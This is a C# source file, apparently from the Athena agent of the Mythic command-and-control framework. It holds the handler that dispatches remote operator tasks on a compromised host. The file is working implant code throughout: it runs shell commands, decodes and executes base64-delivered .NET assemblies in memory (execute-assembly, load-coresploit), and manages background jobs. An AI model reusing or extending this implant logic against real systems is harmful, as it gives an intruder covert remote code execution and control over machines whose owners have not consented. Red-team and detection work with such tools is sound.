using Athena.Mythic.Model;

using System;
using System.Collections.Generic;
using Athena.Commands.Model;
using Athena.Utilities;
using Newtonsoft.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using System.Text;
using System.IO;

namespace Athena.Commands
{

    public class CommandHandler
    {
        public static void StartJob(MythicJob task)
        {
            MythicJob job = Globals.jobs[task.task.id];
            job.started = true;
            switch (job.task.command)
            {
                case "builtin":
                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "cat":
                    job.taskresult = checkAndRunPlugin(job.task.command,JsonConvert.DeserializeObject <Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "cp":
                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "download":

                    break;
                case "execute-assembly":
                    if (Globals.executeAssemblyTask != "")
                    {
                        job.complete = true;
                        job.errored = true;
                        job.taskresult = "Failed to load assembly. Another assembly is already executing.";
                        job.hasoutput = true;
                    }
                    else
                    {
                        var t = Task.Run(() =>
                        {
                            Globals.executeAssemblyTask = job.task.id;
                            ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
                            job.hasoutput = true;
                            using (var consoleWriter = new ConsoleWriter()) {
                                var origStdout = Console.Out;
                                try
                                {
                                    consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;

                                    //Set output for our ConsoleWriter
                                    Console.SetOut(consoleWriter);

                                    //Start a new thread for our blocking Execute-Assembly
                                    Globals.executAseemblyThread = new Thread(() =>
                                    {
                                        try
                                        {
                                            job.hasoutput = true;
                                            AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), "");
                                            //Assembly finished executing.
                                            Globals.executeAssemblyTask = "";
                                            job.hasoutput = true;
                                            job.complete = true;
                                            Console.SetOut(origStdout);
                                        }
                                        catch (ThreadInterruptedException e)
                                        {
                                            //Cancellation was requested, clean up.
                                            Globals.executeAssemblyTask = "";
                                            job.hasoutput = true;
                                            job.complete = true;
                                            job.errored = true;
                                            Console.SetOut(origStdout);
                                            Globals.alc.Unload();
                                            Globals.alc = new System.Runtime.Loader.AssemblyLoadContext("Athena");
                                        }
                                        catch(ThreadAbortException e)
                                        {
                                            Globals.executeAssemblyTask = "";
                                            job.hasoutput = true;
                                            job.complete = true;
                                            job.errored = true;
                                            Console.SetOut(origStdout);
                                            Globals.alc.Unload();
                                            Globals.alc = new System.Runtime.Loader.AssemblyLoadContext("Athena");
                                        }
                                        return;
                                    });

                                    Globals.executAseemblyThread.IsBackground = true;
                                    //Start our assembly.
                                    Globals.executAseemblyThread.Start();
                                }
                                catch(Exception e)
                                {
                                    //General exception catching
                                    Globals.executeAssemblyTask = "";
                                    job.complete = true;
                                    job.taskresult = e.Message;
                                    job.errored = true;
                                    job.hasoutput = true;
                                    Console.SetOut(origStdout);
                                }
                            }
                        }, job.cancellationtokensource.Token);
                    }
                    break;
                case "exit":
                    Globals.exit = true;
                    job.complete = true;
                    job.taskresult = "Exiting";
                    job.hasoutput = true;
                    break;
                case "ifconfig":
                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "jobs":
                    Task.Run(() => {
                        string output = "ID\t\t\t\t\t\tName\t\tStatus\r\n";
                        output += "-----------------------------------------------------------------------------------\r\n";
                        foreach (var job in Globals.jobs)
                        {
                            if (job.Value.started &! job.Value.complete)
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Started");
                            }
                            else if (job.Value.complete)
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Completed");
                            }
                            else
                            {
                                output += String.Format("{0}\t\t{1}\t\t\t{2}\r\n", job.Value.task.id, job.Value.task.command, "Not Started");
                            }
                        }
                        task.hasoutput = true;
                        task.complete = true;
                        task.taskresult = output;
                    });
                    break;
                case "jobkill":
                    Task.Run(() =>
                    {
                        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == task.task.parameters).Value;
                        if (job != null)
                        {
                            //Attempt the cancel.
                            job.cancellationtokensource.Cancel();

                            //Wait to see if the cancel took.
                            for (int i = 0; i != 30; i++)
                            {
                                //Job exited successfully
                                if (job.complete)
                                {
                                    task.taskresult = $"Task {task.task.parameters} exited successfully.";
                                    task.complete = true;
                                    task.hasoutput = true;
                                    break;
                                }
                                //Job may have failed to cancel
                                if (i == 30 && !job.complete)
                                {
                                    task.taskresult = $"Unable to cancel Task: {task.task.parameters}. Request timed out.";
                                    task.complete = true;
                                    task.hasoutput = true;
                                    task.errored = true;
                                }
                                //30s timeout
                                Thread.Sleep(1000);
                            }
                        }
                        else
                        {
                            task.taskresult = $"Task {task.task.parameters} not found!";
                            task.complete = true;
                            task.hasoutput = true;
                        }
                    });
                    break;
                case "ls":
                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "load":
                    LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.name);
                    job.complete = true;
                    job.hasoutput = true;
                    break;
                //Can these all be merged into one and handled on the server-side?
                case "load-assembly":
                    LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly));
                    break;
                case "load-command":
                    LoadAssembly loadcommand = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcommand.assembly),"test");
                    break;
                case "load-coresploit":
                    LoadAssembly loadcs = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
                    job.taskresult = AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(loadcs.assembly), "test");
                    break;
                case "mkdir":
                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "mv":
                    job.taskresult = checkAndRunPlugin(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
                    job.complete = true;
                    job.hasoutput = true;
                    if (string.IsNullOrEmpty(job.taskresult))
                    {
                        job.errored = true;
                        job.taskresult = "Plugin not loaded. Please use load-command to load the plugin!";
                    }
                    else if (job.taskresult.StartsWith("[ERROR]"))
                    {
                        job.errored = true;
                        job.taskresult = job.taskresult.Replace("[ERROR]", "");
                    }
                    break;
                case "reset-assembly-context":
                    job.taskresult = AssemblyHandler.ClearAssemblyLoadContext();
                    job.complete = true;
                    job.hasoutput = true;
                    break;
                case "shell":
                    job.taskresult = Execution.ShellExec(job.task);
                    job.complete = true;
                    break;
                case "sleep":
                    break;
                case "stop-assembly":
                    if(Globals.executAseemblyThread != null)
                    {
                        Globals.executAseemblyThread.Interrupt();
                        job.complete = true;
                        job.taskresult = "Cancellation Requested.";
                        job.hasoutput = true;
                        Globals.executeAssemblyTask = "";
                        Globals.alc.Unload();
                    }
                    else
                    {
                        job.complete = true;
                        job.taskresult = "No execute-assembly task currently running.";
                        job.hasoutput = true;
                    }
                    break;
                default:
                    //Maybe convert the default to the loaded commands?
                    //Can I have all the default plugins use one "case" statement to load?
                    job.taskresult = "Command not found.";
                    job.errored = true;
                    break;
            }
            if (!string.IsNullOrEmpty(job.taskresult))
            {
                job.hasoutput = true;
            }
            else
            {
                job.hasoutput = false;
            }
        }

        static void consoleWriter_WriteLineEvent(object sender, ConsoleWriterEventArgs e)
        {
            try
            {
                MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == Globals.executeAssemblyTask).Value;
                job.taskresult += e.Value + Environment.NewLine;
                job.hasoutput = true;
            }
            catch
            {

            }
        }

        static string checkAndRunPlugin(string name, Dictionary<string, object> s)
        {
            foreach(var kvp in s)
            {
                Console.WriteLine("Key: " + kvp.Key);
                Console.WriteLine("Value: " + kvp.Value);
            }
            if (Globals.loadedcommands.ContainsKey(name))
            {
                return AssemblyHandler.RunLoadedCommand(name, s);
            }
            else
            {
                return "";
            }
        }
        //static void consoleWriter_WriteEvent(object sender, ConsoleWriterEventArgs e)
        //{
        //    try
        //    {
        //        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == Globals.executeAssemblyTask).Value;
        //        job.taskresult += e.Value;
        //        job.hasoutput = true;
        //    }
        //    catch
        //    {

        //    }
        //}
    }
}
